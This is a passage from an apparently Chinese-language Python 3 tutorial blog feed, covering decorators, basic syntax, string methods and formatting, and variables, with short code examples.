<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn_1</span>(<span class="params">old</span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">fn_2</span>():</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;---&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">		result = old()	<span class="comment"># 调用传入的参数</span></span><br><span class="line">        <span class="comment"># 这里使用变量保存，如果直接return会直接结束函数，后面的语句就不能执行</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;---&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">		<span class="keyword">return</span> result</span><br><span class="line">	<span class="keyword">return</span> fn_2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@fn_1	</span><span class="comment"># 把函数fn3传入fn_1，利用fn_1装饰fn3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn3</span>():</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;大家好&#x27;</span>)</span><br><span class="line">fn3()</span><br><span class="line">--------------------</span><br><span class="line">大家好</span><br><span class="line">--------------------</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python3</category>
        <category>Python3基础</category>
      </categories>
      <tags>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title>python3-基础语法</title>
    <url>//3df47f907de1.html</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer" />

<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>默认情况下，python3源码文件以<code>UTF-8</code>作为编码，所有字符串都是<code>Unicode</code>字符串。也可以手动为源码文件指定不同的编码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br></pre></td></tr></table></figure>



<h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p>也就是变量名，虽然在python没有明确限制，但是有一套默认的命名规则</p>
<ul>
<li>第一个字符必须是字母或下划线_</li>
<li>标识符的其他部分由字母，数字和下划线组成</li>
<li>标识符对大小写敏感</li>
</ul>
<h2 id="python保留字"><a href="#python保留字" class="headerlink" title="python保留字"></a>python保留字</h2><p>保留字即关键字，我们不能把它们用作任何标识符名称。Python 的标准库提供了一个 keyword 模块，可以输出当前版本的所有关键字：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> keyword</span><br><span class="line">test = keyword.kwlist</span><br><span class="line"><span class="built_in">print</span>(test)</span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;as&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;async&#x27;</span>, <span class="string">&#x27;await&#x27;</span>, <span class="string">&#x27;break&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;continue&#x27;</span>, <span class="string">&#x27;def&#x27;</span>, <span class="string">&#x27;del&#x27;</span>, <span class="string">&#x27;elif&#x27;</span>, <span class="string">&#x27;else&#x27;</span>, <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;finally&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;from&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;is&#x27;</span>, <span class="string">&#x27;lambda&#x27;</span>, <span class="string">&#x27;nonlocal&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;raise&#x27;</span>, <span class="string">&#x27;return&#x27;</span>, <span class="string">&#x27;try&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;yield&#x27;</span>]</span><br></pre></td></tr></table></figure>



<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>当我们想给一些代码添加说明，又不参与代码运行的时候，就要通过添加注释的方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 单行注释</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)	<span class="comment"># 输出hello</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多行注释</span></span><br><span class="line"><span class="comment"># 可以使用&#x27;&#x27;&#x27;或者&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">我们是一段注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">我们是一段注释</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>



<h2 id="行与缩进"><a href="#行与缩进" class="headerlink" title="行与缩进"></a>行与缩进</h2><p>python中以缩进来表示代码块</p>
<p>缩进的空格是可变的，但是同一个代码块的语句必须包含相同的缩进空格数</p>
<p>这里没有明确限制，不过默认缩进为一个tab，也就是四个空格</p>
<p>如果同一个代码块的缩进空格数不一样，那么程序就会报错</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;True&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;False&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="多行语句"><a href="#多行语句" class="headerlink" title="多行语句"></a>多行语句</h2><p>python中通常是一行写完一条语句，但如果语句很长，我们可以使用反斜杠<code>\</code>来实现多行语句。例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = test_one + \</span><br><span class="line">       test_two + \</span><br><span class="line">       test_three</span><br></pre></td></tr></table></figure>

<p>在 <code>[]</code>, <code>&#123;&#125;</code>, 或 <code>()</code> 中的多行语句，不需要使用反斜杠<code>\</code>，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = [<span class="string">&#x27;test_one&#x27;</span>,<span class="string">&#x27;test_two&#x27;</span>,<span class="string">&#x27;test_three&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;test_four&#x27;</span>,<span class="string">&#x27;test_five&#x27;</span>]</span><br></pre></td></tr></table></figure>



<h2 id="标准数据类型"><a href="#标准数据类型" class="headerlink" title="标准数据类型"></a>标准数据类型</h2><p>Python3中有六个标准的数据类型：</p>
<ul>
<li>Number（数字）</li>
<li>String（字符串）</li>
<li>List（列表）</li>
<li>Tuple（元组）</li>
<li>Set（集合）</li>
<li>Dictionary（字典）</li>
</ul>
<p>Python3的六个标准数据库类型中：</p>
<ul>
<li>不可变数据：Number（数字）、String（字符串）、Tuple（元组）</li>
<li>可变数据：List（列表）、Dictionary（字典）、Set（集合）</li>
</ul>
<h2 id="数字-Number-类型"><a href="#数字-Number-类型" class="headerlink" title="数字(Number)类型"></a>数字(Number)类型</h2><p>python中数字有四种类型：整数、布尔型、浮点数和复数。</p>
<ul>
<li><strong>int</strong> (整数), 如 1, 只有一种整数类型 int，表示为长整型，没有 python2 中的 Long。</li>
<li><strong>bool</strong> (布尔), 如 True。</li>
<li><strong>float</strong> (浮点数), 如 1.23、3E-2</li>
<li><strong>complex</strong> (复数), 如 1 + 2j、 1.1 + 2.2j</li>
</ul>
<h2 id="二进制类型"><a href="#二进制类型" class="headerlink" title="二进制类型"></a>二进制类型</h2><p>Python中二进制有三种类型</p>
<ul>
<li><strong>bytes()</strong></li>
<li><strong>bytearray()</strong></li>
<li><strong>memoryview()</strong></li>
</ul>
<h2 id="字符串-String"><a href="#字符串-String" class="headerlink" title="字符串(String)"></a>字符串(String)</h2><ul>
<li>python中单引号和双引号使用完全相同。</li>
<li>使用三引号(‘’’或”””)可以指定一个多行字符串。</li>
<li>转义符 <code>\</code></li>
<li>反斜杠可以用来转义，使用r可以让反斜杠不发生转义。。 如 <code>r&quot;this is a line with \n&quot;</code> 则<code>\n</code>会显示，并不是换行。</li>
<li>按字面意义级联字符串，如”this “ “is “ “string”会被自动转换为this is string。</li>
<li>字符串可以用 + 运算符连接在一起，用 * 运算符重复。</li>
<li>Python 中的字符串有两种索引方式，从左往右以 0 开始，从右往左以 -1 开始。</li>
<li>Python中的字符串不能改变。</li>
<li>Python 没有单独的字符类型，一个字符就是长度为 1 的字符串。</li>
<li>字符串的截取的语法格式如下：<strong>变量[头下标:尾下标:步长]</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">word = <span class="string">&#x27;字符串&#x27;</span></span><br><span class="line">sentence = <span class="string">&quot;这是一个句子。&quot;</span></span><br><span class="line">paragraph = <span class="string">&quot;&quot;&quot;这是一个段落，</span></span><br><span class="line"><span class="string">可以由多行组成&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>





<h2 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h2><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">int(x)</td>
<td align="center">将x转换成整数类型</td>
</tr>
<tr>
<td align="center">float(x)</td>
<td align="center">将x转换成浮点型</td>
</tr>
<tr>
<td align="center">complex(real [,imag])</td>
<td align="center">创建一个复数</td>
</tr>
<tr>
<td align="center">str(x)</td>
<td align="center">将x转换为字符串</td>
</tr>
<tr>
<td align="center">repr(x)</td>
<td align="center">将x转换为表达式字符串</td>
</tr>
<tr>
<td align="center">eval(str)</td>
<td align="center">计算在字符串中的有效python表达式，并返回一个对象</td>
</tr>
<tr>
<td align="center">chr(x)</td>
<td align="center">将整数x转换为一个字符</td>
</tr>
<tr>
<td align="center">ord(x)</td>
<td align="center">将一个字符x转换为它对应的整数值</td>
</tr>
<tr>
<td align="center">hex(x)</td>
<td align="center">将一个整数x转换为一个十六进制的字符串</td>
</tr>
<tr>
<td align="center">oct(x)</td>
<td align="center">将一个整数x转换为一个八进制的字符串</td>
</tr>
</tbody></table>
<h2 id="import-与-from…import"><a href="#import-与-from…import" class="headerlink" title="import 与 from…import"></a>import 与 from…import</h2><p>在 python 用 <strong>import</strong> 或者 <strong>from…import</strong> 来导入相应的模块。</p>
<p>将整个模块(somemodule)导入，格式为： <strong>import somemodule</strong></p>
<p>从某个模块中导入某个函数,格式为： <strong>from somemodule import somefunction</strong></p>
<p>从某个模块中导入多个函数,格式为： <strong>from somemodule import firstfunc, secondfunc, thirdfunc</strong></p>
<p>将某个模块中的全部函数导入，格式为： <strong>from somemodule import *</strong></p>
<p>两者之间作用域不一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 基础模块 a.py</span><br><span class="line">data=[1,2,3]</span><br><span class="line"> </span><br><span class="line">def run():</span><br><span class="line">	print(data)</span><br></pre></td></tr></table></figure>

<p>**import…**导入模块+</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#test.py</span></span><br><span class="line"><span class="keyword">import</span> a</span><br><span class="line"><span class="comment">#由于是直接import a 所以都是从源模块a里面拿出来的，所以这里的改变都会影响源模块a</span></span><br><span class="line"><span class="comment">#可以理解为有着作用域 a.的限制</span></span><br><span class="line">a.data[<span class="number">0</span>]=<span class="number">5</span> </span><br><span class="line"><span class="built_in">print</span>(a.data) <span class="comment">#输出[5,2,3]</span></span><br><span class="line">a.run() <span class="comment">#输出[5,2,3]</span></span><br><span class="line"> </span><br><span class="line">a.data=<span class="number">100</span> <span class="comment">#因为这里影响的是a里面的data</span></span><br><span class="line"><span class="built_in">print</span>(a.data) <span class="comment">#输出100</span></span><br><span class="line">a.run() <span class="comment">#输出100</span></span><br></pre></td></tr></table></figure>

<p>**from…import…**导入模块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#test1.py</span></span><br><span class="line"><span class="keyword">from</span> a <span class="keyword">import</span> run,data</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">data[<span class="number">0</span>]=<span class="number">5</span> <span class="comment">#类似赋值，b里面的data和a里面的data指向同一个对象，这么做对两者都有影响</span></span><br><span class="line"><span class="built_in">print</span>(data) <span class="comment">#输出[5,2,3] </span></span><br><span class="line">run()<span class="comment">#输出[5,2,3]</span></span><br><span class="line"> </span><br><span class="line">data=<span class="number">100</span> <span class="comment">#由于直接改变了data的指向，所以不会影响源模块a</span></span><br><span class="line"><span class="built_in">print</span>(data) <span class="comment">#输出100</span></span><br><span class="line">run()<span class="comment">#输出[5,2,3]</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python3</category>
        <category>Python3基础</category>
      </categories>
      <tags>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-字符串</title>
    <url>//098f54875b2d.html</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer" />

<h2 id="Python3字符串"><a href="#Python3字符串" class="headerlink" title="Python3字符串"></a>Python3字符串</h2><p>字符串可以用单引号，双引号，三引号表示<br>字符串是序列，可使用所有序列的方法<br>字符串是不可改变的</p>
<h2 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h2><p>​        在Python中，有两种常用的字符串类型，分别为str和bytes。其中，str表示Unicode字符（ASCII或者其他）；bytes表示二进制数据（包括编码的文本）。这两种类型的字符串不能拼接在一起使用。</p>
<p>​        通常情况下，str在内存中以Unicode表示，一个字符对应若干个字节。但是如果在网络上传输，或者保存到磁盘上，就需要把str转换为字节类型，即bytes类型。</p>
<h2 id="字符串编码"><a href="#字符串编码" class="headerlink" title="字符串编码"></a>字符串编码</h2><p>Python3直接支持Unicode，可以表示世界上任何书面语言的字符。Phthon3的字符默认就是16位的Unicode编码，ASCII码是Unicode编码的子集。</p>
<p>使用内置函数<code>ord()</code>可以把字符串转换成对应的Unicode码；</p>
<p>使用内置函数<code>chr()</code>可以把十进制数字转换成对应的字符；</p>
<p>使用<code>encode()</code>编码，可以把字符串转换为二进制数据(bytes)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a.encode(encoding=<span class="string">&quot;utf-8&quot;</span>,errors=<span class="string">&quot;strict&quot;</span>)</span><br><span class="line"><span class="comment"># errors=&quot;strict&quot;：可选参数，用于指定错误处理方式，其可选择值可以是strict（遇到非法字符就抛出异常）、ignore（忽略非法字符）、replace（用“?”替换非法字符）或xmlcharrefreplace（使用XML的字符引用）等，默认值为strict。</span></span><br><span class="line">a.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">a.encode(<span class="string">&quot;GBK&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>使用<code>decode()</code>解码，用于将二进制转换为字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a.decode(encoding=<span class="string">&quot;utf-8&quot;</span>,errors=<span class="string">&quot;strict&quot;</span>)</span><br><span class="line">a.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">a.decode(<span class="string">&quot;GBK&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h2><p>用来访问字符串中的值</p>
<p>语法格式为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">变量[头下标:尾下标:步长]</span><br></pre></td></tr></table></figure>

<p>索引值以0为开始值，-1为从末尾的开始位置</p>
<p>步长默认为1，起始位置(包括)和结束位置(不包括)也可省略不写</p>
<p><strong>str = ‘abcde’</strong></p>
<table>
<thead>
<tr>
<th align="center">字符串</th>
<th align="center">a</th>
<th align="center">b</th>
<th align="center">c</th>
<th align="center">d</th>
<th align="center">e</th>
</tr>
</thead>
<tbody><tr>
<td align="center">下标</td>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">2</td>
<td align="center">3</td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">末尾为开始位置</td>
<td align="center">-5</td>
<td align="center">-4</td>
<td align="center">-3</td>
<td align="center">-2</td>
<td align="center">-1</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;abced&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span>[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="built_in">str</span>[<span class="number">1</span>] = <span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="built_in">str</span>[<span class="number">2</span>] = <span class="string">&#x27;c&#x27;</span></span><br><span class="line"><span class="built_in">str</span>[<span class="number">3</span>] = <span class="string">&#x27;d&#x27;</span></span><br><span class="line"><span class="built_in">str</span>[<span class="number">4</span>] = <span class="string">&#x27;e&#x27;</span></span><br><span class="line"><span class="built_in">str</span>[:] = <span class="string">&#x27;abced&#x27;</span> </span><br><span class="line"><span class="built_in">str</span>[<span class="number">0</span>:] = <span class="string">&#x27;abced&#x27;</span></span><br><span class="line"><span class="built_in">str</span>[:<span class="number">5</span>] = <span class="string">&#x27;abced&#x27;</span> </span><br><span class="line"><span class="built_in">str</span>[:<span class="number">3</span>] = <span class="string">&#x27;abc&#x27;</span></span><br><span class="line"><span class="built_in">str</span>[<span class="number">0</span>:<span class="number">2</span>] = <span class="string">&#x27;ab&#x27;</span></span><br><span class="line"><span class="built_in">str</span>[<span class="number">1</span>:<span class="number">4</span>] = <span class="string">&#x27;bcd&#x27;</span></span><br><span class="line"><span class="built_in">str</span>[<span class="number">0</span>:<span class="number">5</span>:<span class="number">2</span>] = <span class="string">&#x27;ace&#x27;</span> </span><br></pre></td></tr></table></figure>



<h2 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h2><p>使用不同的方式把变量代入到字符串中输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 拼串</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;欢迎 &#x27;</span>+name+<span class="string">&#x27; 光临！&#x27;</span>)</span><br><span class="line"><span class="comment"># 多个参数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;欢迎&#x27;</span>,name,<span class="string">&#x27;光临！&#x27;</span>)</span><br><span class="line"><span class="comment"># 占位符</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;欢迎 %s 光临！&#x27;</span>%name)</span><br><span class="line"><span class="comment"># 格式化字符串</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;欢迎 <span class="subst">&#123;name&#125;</span> 光临！&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="Python转义字符"><a href="#Python转义字符" class="headerlink" title="Python转义字符"></a>Python转义字符</h2><p>可以使用 <code>\</code> 作为转义字符，通过转义字符，可以在字符串中使用一些特殊的内容</p>
<table>
<thead>
<tr>
<th align="center">转义字符</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">\ (在结尾时)</td>
<td align="center">续航符，连接下一行为同一行语句</td>
</tr>
<tr>
<td align="center">\‘</td>
<td align="center">转义单引号</td>
</tr>
<tr>
<td align="center">\\</td>
<td align="center">转义斜杠</td>
</tr>
<tr>
<td align="center">\“</td>
<td align="center">转义双引号</td>
</tr>
<tr>
<td align="center">\t</td>
<td align="center">转义制表符(TAB)</td>
</tr>
<tr>
<td align="center">\v</td>
<td align="center">转义纵向制表符(TAB)</td>
</tr>
<tr>
<td align="center">\n</td>
<td align="center">转义换行符</td>
</tr>
<tr>
<td align="center">\f</td>
<td align="center">转义换页</td>
</tr>
<tr>
<td align="center">\b</td>
<td align="center">转义删除键</td>
</tr>
<tr>
<td align="center">\r</td>
<td align="center">转义回车</td>
</tr>
<tr>
<td align="center">\0</td>
<td align="center">转义为空</td>
</tr>
<tr>
<td align="center">\0dd</td>
<td align="center">八进制数，dd代表的字符，如\012代表换行</td>
</tr>
<tr>
<td align="center">\xhh</td>
<td align="center">十六进制数，hh代表的字符，如\x0a代表换行</td>
</tr>
<tr>
<td align="center">\uxxxx</td>
<td align="center">表示Unicode编码</td>
</tr>
</tbody></table>
<h2 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h2><table>
<thead>
<tr>
<th align="center">符号</th>
<th align="center">描述</th>
<th align="center">实例</th>
<th align="center">结果</th>
</tr>
</thead>
<tbody><tr>
<td align="center">%s</td>
<td align="center">格式化字符串（采用str()的显示）</td>
<td align="center">print(‘this is %s’ %(‘abcde’))</td>
<td align="center">this is abcde</td>
</tr>
<tr>
<td align="center">%r</td>
<td align="center">格式化字符串（采用repr()的显示）</td>
<td align="center">print(‘this is %r’ %(‘abcde’))</td>
<td align="center">this is ‘abcde’</td>
</tr>
<tr>
<td align="center">%c</td>
<td align="center">格式化字符及其ASCII码</td>
<td align="center">print(‘this is %c’ %34)</td>
<td align="center">this is “</td>
</tr>
<tr>
<td align="center">%d</td>
<td align="center">格式化整数</td>
<td align="center">print(‘this is %d’ %10.7)</td>
<td align="center">this is 10</td>
</tr>
<tr>
<td align="center">%o</td>
<td align="center">格式化无符号八进制数</td>
<td align="center">print(‘this is %o’ %8)</td>
<td align="center">this is 10</td>
</tr>
<tr>
<td align="center">%x</td>
<td align="center">格式化无符号十六进制数</td>
<td align="center">print(‘this is %x’ %10)</td>
<td align="center">this is a</td>
</tr>
<tr>
<td align="center">%e</td>
<td align="center">用科学计数法格式化浮点数</td>
<td align="center">print(‘this is %e’ %10)</td>
<td align="center">this is 1.000000e+01</td>
</tr>
<tr>
<td align="center">%f</td>
<td align="center">格式化浮点数；第三位开始会四舍五入</td>
<td align="center">print(‘this is %.3f’ %10.777777)</td>
<td align="center">this is 10.778</td>
</tr>
</tbody></table>
<p>format()方法占位组合字符串和数字</p>
<table>
<thead>
<tr>
<th align="center">数字</th>
<th align="center">格式</th>
<th align="center">输出</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">3.1415926</td>
<td align="center">{ : .2f}</td>
<td align="center">3.14</td>
<td align="center">保留小数两位</td>
</tr>
<tr>
<td align="center">3.1415926</td>
<td align="center">{: +.2f}</td>
<td align="center">3.14</td>
<td align="center">带符号保留小数两位</td>
</tr>
<tr>
<td align="center">2.718</td>
<td align="center">{: .0f}</td>
<td align="center">3</td>
<td align="center">不带小数</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">{: 0&gt;2d}</td>
<td align="center">05</td>
<td align="center">数字补0(填充左边，宽度为2)</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">{: x&lt;4d}</td>
<td align="center">5xxx</td>
<td align="center">数字补x(填充左边，宽度为4)</td>
</tr>
<tr>
<td align="center">100000</td>
<td align="center">{: ,}</td>
<td align="center">100,000</td>
<td align="center">以逗号分割数字</td>
</tr>
<tr>
<td align="center">0.25</td>
<td align="center">{: .2%}</td>
<td align="center">25.00%</td>
<td align="center">百分比格式</td>
</tr>
<tr>
<td align="center">1000000000</td>
<td align="center">{: .2e}</td>
<td align="center">1.00E+09</td>
<td align="center">指数记法</td>
</tr>
<tr>
<td align="center">13</td>
<td align="center">{:10d}</td>
<td align="center">13</td>
<td align="center">右对齐（默认，宽度为10）</td>
</tr>
<tr>
<td align="center">13</td>
<td align="center">{:&lt;10d}</td>
<td align="center">13</td>
<td align="center">左对齐（宽度为10）</td>
</tr>
<tr>
<td align="center">13</td>
<td align="center">{:^10d}</td>
<td align="center">13</td>
<td align="center">居中（宽度为10）</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a1 = <span class="number">3</span></span><br><span class="line">a2 = <span class="number">567</span></span><br><span class="line">a3 = <span class="number">49.95</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;I want &#123;2&#125; pieces of item &#123;0&#125; for &#123;1&#125; dollars.&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>.<span class="built_in">format</span>(a1,a2,a3))</span><br><span class="line"></span><br><span class="line">I want <span class="number">49.95</span> pieces of item <span class="number">3</span> <span class="keyword">for</span> <span class="number">567</span> dollars.</span><br></pre></td></tr></table></figure>



<h2 id="字符串内置方法"><a href="#字符串内置方法" class="headerlink" title="字符串内置方法"></a>字符串内置方法</h2><p>所有字符串方法都返回新值，不会更改原始字符串<br>使用说明：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(x.方法名(条件))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">capitalize()	把首字符转换为大写。</span><br><span class="line">casefold()		把字符串转换为小写。</span><br><span class="line">center()		返回居中的字符串。</span><br><span class="line">count()			返回指定值在字符串中出现的次数。</span><br><span class="line">encode()		返回字符串的编码版本。</span><br><span class="line">endswith()		如果字符串以指定值结尾，则返回 true。</span><br><span class="line">expandtabs()	设置字符串的 tab 尺寸。</span><br><span class="line">find()			在字符串中搜索指定的值并返回它被找到的位置。</span><br><span class="line"><span class="built_in">format</span>()		格式化字符串中的指定值。</span><br><span class="line">format_map()	格式化字符串中的指定值。</span><br><span class="line">index()			在字符串中搜索指定的值并返回它被找到的位置。</span><br><span class="line">isalnum()		如果字符串中的所有字符都是字母数字，则返回 <span class="literal">True</span>。</span><br><span class="line">isalpha()		如果字符串中的所有字符都在字母表中，则返回 <span class="literal">True</span>。</span><br><span class="line">isdecimal()		如果字符串中的所有字符都是小数，则返回 <span class="literal">True</span>。</span><br><span class="line">isdigit()		如果字符串中的所有字符都是数字，则返回 <span class="literal">True</span>。</span><br><span class="line">isidentifier()	如果字符串是标识符，则返回 <span class="literal">True</span>。</span><br><span class="line">islower()		如果字符串中的所有字符都是小写，则返回 <span class="literal">True</span>。</span><br><span class="line">isnumeric()		如果字符串中的所有字符都是数，则返回 <span class="literal">True</span>。</span><br><span class="line">isprintable()	如果字符串中的所有字符都是可打印的，则返回 <span class="literal">True</span>。</span><br><span class="line">isspace()		如果字符串中的所有字符都是空白字符，则返回 <span class="literal">True</span>。</span><br><span class="line">istitle()		如果字符串遵循标题规则，则返回 <span class="literal">True</span>。</span><br><span class="line">isupper()		如果字符串中的所有字符都是大写，则返回 <span class="literal">True</span>。</span><br><span class="line">join()			把可迭代对象的元素连接到字符串的末尾。</span><br><span class="line"><span class="built_in">len</span>()			计算字符串的长度</span><br><span class="line">ljust()			返回字符串的左对齐版本。</span><br><span class="line">lower()			把字符串转换为小写。</span><br><span class="line">lstrip()		返回字符串的左修剪版本。</span><br><span class="line">maketrans()		返回在转换中使用的转换表。</span><br><span class="line">partition()		返回元组，其中的字符串被分为三部分。</span><br><span class="line">replace()		返回字符串，其中指定的值被替换为指定的值。</span><br><span class="line">rfind()			在字符串中搜索指定的值，并返回它被找到的最后位置。</span><br><span class="line">rindex()		在字符串中搜索指定的值，并返回它被找到的最后位置。</span><br><span class="line">rjust()			返回字符串的右对齐版本。</span><br><span class="line">rpartition()	返回元组，其中字符串分为三部分。</span><br><span class="line">rsplit()		在指定的分隔符处拆分字符串，并返回列表。</span><br><span class="line">rstrip()		返回字符串的右边修剪版本。</span><br><span class="line">split(<span class="string">&#x27;-&#x27;</span>,<span class="number">4</span>)	在指定的分隔符处拆分字符串，并返回列表。使用<span class="string">&#x27;-&#x27;</span>分割，只分割前四个</span><br><span class="line">splitlines()	在换行符处拆分字符串并返回列表。</span><br><span class="line">startswith()	如果以指定值开头的字符串，则返回 true。</span><br><span class="line">strip()			返回字符串的剪裁版本。</span><br><span class="line">swapcase()		切换大小写，小写成为大写，反之亦然。</span><br><span class="line">title()			把每个单词的首字符转换为大写。</span><br><span class="line">translate()		返回被转换的字符串。</span><br><span class="line">upper()			把字符串转换为大写。</span><br><span class="line">zfill()			在字符串的开头填充指定数量的 <span class="number">0</span> 值。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python3</category>
        <category>Python3基础</category>
      </categories>
      <tags>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-常量与变量</title>
    <url>//d9ce8a4b8ba9.html</url>
    <content><![CDATA[<h2 id="常量与变量"><a href="#常量与变量" class="headerlink" title="常量与变量"></a>常量与变量</h2><p><strong>变量</strong>：在程序运行过程中，值会发生变化的量</p>
<p><strong>常量</strong>：在程序运行过程中，值不会发生变化的量</p>
<p>无论是常量还是变量，都是对象，在创建时在内存中占用一块空间，用于保存该对象的值和类型</p>
<h2 id="变量不需要声明类型"><a href="#变量不需要声明类型" class="headerlink" title="变量不需要声明类型"></a>变量不需要声明类型</h2><p>Python的变量和常量不需要事先声明类型，根据Python的动态语言特性会自动分别类型</p>
<p>例如<code>number</code>和<code>string</code>两个变量，在创建时不需要进行如<code>number int</code>和<code>string str</code>这样的声明，</p>
<p>而在一些其他语言是必须的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">number = <span class="number">20</span></span><br><span class="line">string = <span class="string">&#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="先创建在使用"><a href="#先创建在使用" class="headerlink" title="先创建在使用"></a>先创建在使用</h2><p>变量在使用前必须先赋值，变量赋值后才被创建</p>
<p>如果没有赋值而直接使用，会抛出变量未定义的异常</p>
